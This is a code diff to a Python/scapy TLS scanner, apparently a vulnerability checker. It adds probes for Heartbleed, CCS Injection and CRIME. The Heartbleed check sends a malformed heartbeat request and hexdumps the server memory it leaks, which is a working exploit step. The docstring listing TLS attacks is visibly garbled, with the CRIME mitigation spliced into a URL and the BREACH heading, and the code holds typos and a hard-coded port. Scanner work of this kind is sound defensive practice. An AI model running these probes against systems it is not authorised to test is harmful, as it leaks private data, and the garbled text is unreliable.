@@ -136,8 +136,9 @@ Mitigation: Upgrade to TLS 1.1 or TLS 1.2, or use a different cipher suite (such
 4. CRIME (Compression Ratio Info-leak Made Easy)
 Affected Protocol: TLS (with compression enabled)
 Description: CRIME exploits TLS-level data compression (DEFLATE) to leak information from encrypted connections by comparing compressed sizes.
-Mitigation: Disable TLS compression.
-5. BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext)
+Mitigation: Disab://security.stackexchange.com/questions/19911/crime-how-to-beat-the-beast-successor/19914#19914
+5. BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext)le TLS compression.X
+References: https
 Affected Protocol: TLS (with HTTP compression)
 Description: BREACH attacks the HTTP compression used over TLS to extract secrets from HTTPS responses.
 Mitigation: Disable HTTP compression, use random padding, or employ techniques like separating secrets from user input.
@@ -181,6 +182,10 @@ Mitigation: Implement strict protocol-specific validation, isolate services, and
 Affected Protocol: TLS 1.3
 Description: Attackers can force a downgrade from TLS 1.3 to older, less secure versions like TLS 1.2, which are susceptible to attacks like BEAST or CRIME.
 Mitigation: Ensure strict support for TLS 1.3 and use downgrade-resistant mechanisms like the downgrade sentinel in modern libraries.
+16. CCS Injection
+OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly restrict processing of ChangeCipherSpec messages, 
+which allows man-in-the-middle attackers to trigger use of a zero-length master key in certain OpenSSL-to-OpenSSL communications, 
+and consequently hijack sessions or obtain sensitive information, via a crafted TLS handshake, aka the "CCS Injection" vulnerability.
 """
 
 
@@ -193,7 +198,7 @@ import binascii
 
 from OpenSSL import SSL
 
-from scapy.all import AsyncSniffer, SuperSocket
+from scapy.all import AsyncSniffer, SuperSocket, sniff
 from scapy.asn1packet import *
 from scapy.asn1fields import *
 from scapy.layers.x509 import *
@@ -201,16 +206,19 @@ from scapy.layers.tls.cert import *
 from scapy.layers.tls.all import *
 from scapy.layers.tls.crypto import groups as curves
 from scapy.layers.inet import * # IP, TCP
+from scapy.layers.tls.crypto.compression import Comp_Deflate
 
 """
 from ecdsa import NIST192p, NIST224p, NIST256p, NIST384p, NIST521p, SECP256k1
 from ecdsa.keys import SigningKey
 """
-TLS12_CIPHERS = [52243, 52245, 4866,4867,4865,49196,49200,159,52393,52392,52394,49195,49199,158,49188,49192,107,49187,49191,49162,49172,57,49161,49171,51,157,156,61,60,53,47,255]
 TLS13_CIPHERS = [4869, 4868, 4867, 4866, 4865]
-TLS10_CIPHERS = [5, 4, 10, 60, 61, 22, 51, 107, 49169, 49170, 49171, 49172]
+TLS12_CIPHERS = [52243, 52245, 4866,4867,4865,49196,49200,159,52393,52392,52394,49195,49199,158,49188,49192,107,49187,49191,49162,49172,57,49161,49171,51,157,156,61,60,53,47,255]
 TLS11_CIPHERS = [60, 61, 51, 107, 49169, 49171, 49172]
+TLS10_CIPHERS = [5, 4, 10, 60, 61, 22, 51, 107, 49169, 49170, 49171, 49172]
+SSL30_CIPHERS = [5, 4, 10, 60, 61, 22, 51, 107, 49169, 49170, 49171, 49172]
 ciphers = {
+		768: SSL30_CIPHERS,
 		769: TLS10_CIPHERS,
 		770: TLS11_CIPHERS,
 		771: TLS12_CIPHERS,
@@ -229,6 +237,7 @@ class TLSscanner():
 		def __init__(self, target, dstport=443, sourceAddress=None, groups=SUPP_CV_GROUPS_test, sign_algs=SIGN_ALGS):
 			self.target = target
 			self.port = dstport
+			self.local = False if self.port==443 else True
 			if sourceAddress is not None:
 				self.sourceAddress = sourceAddress
 			else:
@@ -267,7 +276,8 @@ class TLSscanner():
 			return None
 		def close_socket(self):
 			if self.sock:
-				self.sock.close() 
+				self.sock.close()
+				self.sock = None
 			return None
 		
 		def getIPv4(self):
@@ -297,27 +307,23 @@ class TLSscanner():
 		def get_tlsInfo(self, packet):
 			return None
 		
-		def create_sniffer(self, prn=None, stop_filter=None):
+		def create_sniffer(self, prn=None, stop_filter=None, pk_fitler=None):
 			if prn is None:
 				prn = self.get_tlsInfo
-			self.sniffer = AsyncSniffer(prn=prn, iface="en0", store=False, session=TCPSession, filter=f"src host {self.target}", stop_filter= (stop_filter if stop_filter else lambda x: x.haslayer(TLS)))
+			self.sniffer = AsyncSniffer(prn=prn, iface="en0", store=False, session=TCPSession, filter=(pk_fitler if pk_fitler else f"src host {self.target}"), stop_filter= (stop_filter if stop_filter else lambda x: x.haslayer(TLS)))
 			# not TLSSession to fetch both tls 1.2 and 1.3, as with aead ciphers in 1.3 scapy doesn't dissects messages correctly
 
 		def get_supportedProtocols(self):
 			self.supportedProtocols, self.NotsupportedProtocols = [], []
 			self.create_sniffer(prn=lambda x: self.check_protos(version=i, srv_hello=x), stop_filter=lambda x: (x.haslayer(TLS) or (x.haslayer(TCP) and (x[TCP].flags == 20 or x[TCP].flags == 11))))
 
-			for i in range(769, 773):
+			for i in range(768, 773):
 				self.connect()
 				ch_pk = self.craft_clientHello(version=i)
 				# print(f"client_hello version {i} : \n {ch_pk.show()}")
 				self.sniffer.start()
 				self.send(ch_pk)
 				self.sniffer.join()
-			for sp in self.supportedProtocols:
-					print(f"{sp} supported")
-			for sp in self.NotsupportedProtocols:
-					print(f"{sp} not supported")
 	
 	
 		def check_protos(self, version, srv_hello):
@@ -710,6 +716,7 @@ class TLSscanner():
 				self.is_renegotiation_secure()
 
 
+		# to be implemented, c
 		def is_renegotiation_secure(self):
 			pass
 
@@ -725,32 +732,112 @@ class TLSscanner():
 		
 		# https://encryptorium.medium.com/the-heartbleed-vulnerability-cve-2014-0160-69eb175cafa7
 		def check_heartbleed(self):
-			context = SSL.Context(SSL.TLSv1_2_METHOD)  # Use TLSv1.2 for security
-			context.set_verify(SSL.VERIFY_NONE, lambda *args: True)
-			self.connect(ssl_context=context)
-			sniffer = AsyncSniffer(prn=lambda x: self.check_heartbeat_response(x), iface="lo0", store=False, filter=f"{self.port}", stop_filter= lambda x: (x.haslayer(TCP) and (x[TCP].flags == 20 or x[TCP].flags == 11)), timeout=10, session=TLSSession)
+			#context = SSL.Context(SSL.TLSv1_2_METHOD)  # Use TLSv1.2 for security
+			#context.set_verify(SSL.VERIFY_NONE, lambda *args: True)
+			self.connect()
+			sniffer = AsyncSniffer(prn=lambda x: self.check_heartbeat_response(x), iface=("lo0" if self.local else "en0"), filter=("" if self.local else f"host {self.target}"), stop_filter= lambda x: (x.haslayer(TCP) and (x[TCP].flags == 20 or x[TCP].flags == 11)) or x.haslayer(TLSAlert), timeout=10, store=False, session=TLSSession)
 			sniffer.start()
-			ch_pk = self.craft_clientHello(sn=False)
+			ch_pk = self.craft_clientHello()
 			self.send(ch_pk)
-			time.sleep(0.3)
 			hb_pk = self.h2bin('18 03 03 00 03 01 40 00')
 			self.send(hb_pk)
-			time.sleep(3)
 			sniffer.join()
 		
 		def check_heartbeat_response(self, pk):
 			if pk.haslayer(Raw):
-				pk.show()
-				if pk[Raw].load.startswith(b'\x18'):
-					print(f"Heartbeat response received")
+				if pk[Raw].load.startswith(b'\x18') and pk[TCP].sport == 8443:
+					print(f"Server is vulnerable to heartbleed attack, {len(pk[Raw].load)} bytes of data leaked: ")
+					self.hexdump(pk[Raw].load)
 					self.close_socket()
 				elif pk[Raw].load.startswith(b'\x15'):
 					print(f"Alert received, Heartbleed likely not possible")
 					self.close_socket()
-			
-			elif(pk.haslayer(TCP) and (pk[TCP].flags == 20 or pk[TCP].flags == 11)):
-				pk.show()
+			elif pk.haslayer(TLSAlert):
+				print(f"TLS Alter received, server does not have heartbeat vulnerability, alert code : {pk[TLSAlert].descr}")
+				self.close_socket()
+		
+			elif(pk.haslayer(TCP) and (pk[TCP].flags == 20 or pk[TCP].flags == 11)) and pk[TCP].sport == 8443:
 				print(f"Connection close received, Heartbleed likely not possible")
+				self.close_socket()
+			else:
+				pass
+
+		
+		def check_ccsinjection(self):
+			self.connect()
+			sniffer = AsyncSniffer(prn=lambda x: self.check_ccs_response(x), iface=("lo0" if self.local else "en0"), filter=("" if self.local else f"host {self.target}"), stop_filter= lambda x: x.haslayer(TCP) and (x[TCP].flags == 20 or x[TCP].flags == 11) or (x.haslayer(TLSAlert)), timeout=10, store=False, session=TCPSession)
+			ch_pk = self.craft_clientHello()
+			self.send(ch_pk)
+			sniffer.start()
+			ccs_pk = TLS(version=(769 if self.local else 771), msg=[TLSChangeCipherSpec()])
+			self.send(ccs_pk)
+			sniffer.join()
+			if self.sock:
+				print(f"No response received, server likely vulnerable to CCS injection")
+				self.close_socket()
+
+
+		def check_ccs_response(self, pk):
+			if pk.haslayer(TLSAlert):
+				pk.show()
+				print(f"Alert record received as response to the invalid CCS Message, CCS injection likely not possible")
+				self.close_socket()
+			else:
+				pass
+
+		def check_crime(self):
+			self.connect()
+			sniffer = AsyncSniffer(prn=lambda x: self.check_crime_response(x), iface=("lo0" if self.local else "en0"), filter=f"" if self.local else f"host {self.target}", stop_filter= lambda x: (x.haslayer(TCP) and (x[TCP].flags == 20 or x[TCP].flags == 11)) or (x.haslayer(TLSAlert)) or (x.haslayer(TLSServerHello) and 0x0 in x[TLSServerHello].comp) or (x.haslayer(Raw) and TLS(x[Raw].load).haslayer(TLSServerHello)), timeout=10, store=False, session=TCPSession)
+			sniffer.start()
+			ch_pk = self.craft_clientHello(cmp=False)
+			self.send(ch_pk)
+			"""
+			resp_pk = sr1(IP(), TCP(), ch_pk, iface="lo0")
+			if resp_pk.haslayer(Raw):
+				pass
+			elif resp_pk.haslayer(TLSServerHello):
+				if 0x01 in resp_pk[TLSServerHello].comp:
+					print(f"Server is vulnerable to CRIME attack, server supports compression")
+					self.close_socket()
+				else:
+					print(f"Server is not vulnerable to CRIME attack, server does not support compression with DEFLATE algorithm")
+					self.close_socket()
+			elif resp_pk.haslayer(TLSAlert):
+				print(f"Alert record received as response to client hello, server does not support compression")
+				self.close_socket()
+			elif(resp_pk.haslayer(TCP) and (resp_pk[TCP].flags == 20 or resp_pk[TCP].flags == 11)):
+				print(f"Connection close received, CRIME likely not possible")
+				self.close_socket()
+			else:
+				pass
+			"""
+			sniffer.join()
+
+		def check_crime_response(self, pk):
+			if pk.haslayer(Raw):
+				srv_hello = TLS(pk[Raw].load)
+				if srv_hello.haslayer(TLSServerHello):
+					if 0x01 in srv_hello[TLSServerHello].comp:
+						print(f"Server is vulnerable to CRIME attack, server supports compression")
+						self.close_socket()
+					else:
+						print(f"Server is not vulnerable to CRIME attack, server does not support compression with DEFLATE algorithm")
+						self.close_socket()
+				else:
+					srv_hello.show()
+			elif pk.haslayer(TLSServerHello):
+				pk.show()
+				if 0x01 in pk[TLSServerHello].comp:
+					print(f"Server is vulnerable to CRIME attack, server supports compression")
+					self.close_socket()
+				else:
+					print(f"Server is not vulnerable to CRIME attack, server does not support compression with DEFLATE algorithm")
+					self.close_socket()
+			elif pk.haslayer(TLSAlert):
+				print(f"Alert record received as response to client hello, server does not support compression")
+				self.close_socket()
+			elif(pk.haslayer(TCP) and (pk[TCP].flags == 20 or pk[TCP].flags == 11)):
+				print(f"Connection close received, CRIME likely not possible")
 				self.close_socket()
 			else:
 				pass
@@ -770,16 +857,19 @@ class TLSscanner():
 					exit(1)
 
 
-		def craft_clientHello(self, version=771, cipher=None, groups=SUPP_CV_GROUPS_test, sign_algs=SIGN_ALGS, pubkeys=None, pskkxmodes=1, ocsp_status_req=None, sn=True, renego_info=False):
-				
+		def craft_clientHello(self, version=771, cipher=None, groups=SUPP_CV_GROUPS_test, sign_algs=SIGN_ALGS, pubkeys=None, pskkxmodes=1, ocsp_status_req=None, renego_info=False, cmp=False):
+			
+			version = 771 if self.local else version
 			try:
-				ch_pk = TLS(version=version, type=22, msg=[TLSClientHello(version=(771 if version>771 else version), ciphers=(cipher if cipher else ciphers[version]), random_bytes=os.urandom(32), ext=[ \
-										(TLS_Ext_ServerName(servernames=[ServerName(nametype=0, servername=(self.target.encode('utf-8')))]) if sn else []), TLS_Ext_SupportedGroups(groups=groups if groups else self.groups), \
+				ch_pk = TLS(version=version, type=22, msg=[TLSClientHello(version=(version), ciphers=(cipher if cipher else ciphers[version]), random_bytes=os.urandom(32), comp=([0x01] if cmp else [0x00]), ext=[ \
+										(TLS_Ext_ServerName(servernames=[ServerName(nametype=0, servername=(self.target.encode('utf-8')))]) if not self.local else []), TLS_Ext_SupportedGroups(groups=groups if groups else self.groups), \
 										TLS_Ext_SignatureAlgorithms(sig_algs=(sign_algs if sign_algs else self.sign_algs)), TLS_Ext_SupportedVersion_CH(versions=[version]), \
 										TLS_Ext_PSKKeyExchangeModes(kxmodes=[pskkxmodes]), TLS_Ext_SupportedPointFormat(ecpl=[0], type=11, len=2, ecpllen=1), \
 										TLS_Ext_EncryptThenMAC(), TLS_Ext_ExtendedMasterSecret(), \
-										(TLS_Ext_CSR(req=ocsp_status_req, stype=1) if ocsp_status_req else []), (TLS_Ext_RenegotiationInfo(renegotiated_connection=b'') if renego_info else [])])])
-			except scapy.error.PacketError as e:
+										(TLS_Ext_CSR(req=ocsp_status_req, stype=1) if ocsp_status_req else []), \
+										(TLS_Ext_RenegotiationInfo(renegotiated_connection=b'') if renego_info else [])])])
+			
+			except scapy.error.Scapy_Exception as e:
 				print( "Error during client hello packet creation \n Check ciphers, groups and signature algorithms used \n After that report this error to the developer \n") 
 				print(f"Packet creation error: {e}")
 				sys.exit(1)
@@ -799,8 +889,13 @@ class TLSscanner():
 				print( "Error during client hello packet creation \n Check ciphers, groups and signature algorithms used \n After that report this error to the developer \n") 
 				print(e)
 				sys.exit(1)
-			
-			ch_pk[TLS].len = len(raw(ch_pk[TLSClientHello]))
+			"""
+			if cmp:
+				deflate_compr = Comp_Deflate()
+				ch_pk[TLS].msg = Raw(deflate_compr.compress(s=bytes(ch_pk[TLSClientHello])))
+			"""
+			ch_pk[TLS].len = len(ch_pk[TLSClientHello])
+
 			if(version==772):
 				ch_pk.msg[0].ext.append(TLS_Ext_KeyShare_CH(client_shares=[]))
 				pubkeys = self.generate_keys(crvs=groups)
@@ -843,6 +938,15 @@ class TLSscanner():
 		
 		def h2bin(self, x):
 			return binascii.unhexlify(x.replace(' ', '').replace('\n', ''))
+		
+		def hexdump(self, s: bytes):
+			for b in range(0, len(s), 16):
+				lin = [c for c in s[b : b + 16]]
+				hxdat = ' '.join('%02X' % c for c in lin)
+				pdat = ''.join((chr(c) if 32 <= c <= 126 else '.' )for c in lin)
+				print('  %04x: %-48s %s' % (b, hxdat, pdat))
+			
+			print("")
 
 			
 			
